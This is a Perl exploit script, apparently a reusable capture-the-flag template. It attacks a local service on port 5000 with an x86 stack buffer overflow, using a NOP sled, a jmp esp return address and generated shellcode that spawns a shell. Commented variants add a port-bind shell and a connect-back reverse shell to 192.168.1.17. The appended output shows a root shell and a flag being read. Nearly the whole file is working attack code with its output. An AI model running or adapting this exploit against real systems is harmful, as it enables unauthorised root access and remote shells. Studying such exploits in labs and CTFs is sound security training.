#!/usr/bin/perl
use pwntools;
# 各アドレスは環境にあわせて更新する必要有
#e.g.
#gdb -q -x bof.gdb bof
#--- find/b a,b,jmpesp ---
#0x8048430 <main+13>
#0x8049430
#2 patterns found.
#--- find/b a,b,callesp ---
#0x8048432 <main+15>
#0x8049432
#2 patterns found.
#--- find/b a,b,pushespret ---
#0x8048439 <main+22>
#0x8049439
#2 patterns found.

$shellcode  = &get_sc('x86', 'dup2', 4);
$shellcode .= &get_sc('x86', 'execve');
#$shellcode  = &get_sc('x86', 'dup2', 4);
#$shellcode .= &get_sc('x86', 'execcmd', 'ls -l;cat flag');
#$shellcode = &get_sc('x86', 'readdir', '.');
#$shellcode = &get_sc('x86', 'readfile', './flag');
#$shellcode = &get_sc('x86', 'portbind', 4000);
##  $ echo "ls;cat flag;" | nc localhost 4000
##  FLAG_GGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
#$shellcode = &get_sc('x86', 'connectback', '192.168.1.17', 4000);
##  $ nc -l 4000 <<END_OF_LINE
##  ls;cat flag
##  END_OF_LINE
##  FLAG_GGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
#$shellcode  = &get_sc('x86', 'stager', 1);

$addr_jmpesp = 0x80483f2;   # (gdb) find/b 0x08048000,0x0804b000-1,0xff,0xe4
$buf = "\x41" x 88;
$buf .= "\x90" x 24;
$buf .= pack('V', $addr_jmpesp) ;
$buf .= $shellcode;
print '[+] '.unpack("H*", $buf)."\n";

&connect(\$s, 'localhost', 5000) or die "ng";
syswrite($s, $buf, length($buf));

# dup2&execve
&interact($s);

# portbind/connectback
#$data = <STDIN>;
#print $data;

# stager
#sleep(1);
#$shellcode = &get_sc('x86', 'dup2', 4);
#$shellcode .= &get_sc('x86', 'execve');
#syswrite($s, $shellcode, length($shellcode));
#&interact($s);

# others
#sleep(1);
#sysread($s, $data, 2048);
#print $data;

close($s);
exit;
__END__
# perl bof.pl
[+] 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141909090909090909090909090909090909090909090909090f28304086a7f5a54596a015b6a0358cd8051c3
id
uid=0(root) gid=0(root) groups=0(root)
cat flag
FLAG_GGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
exit

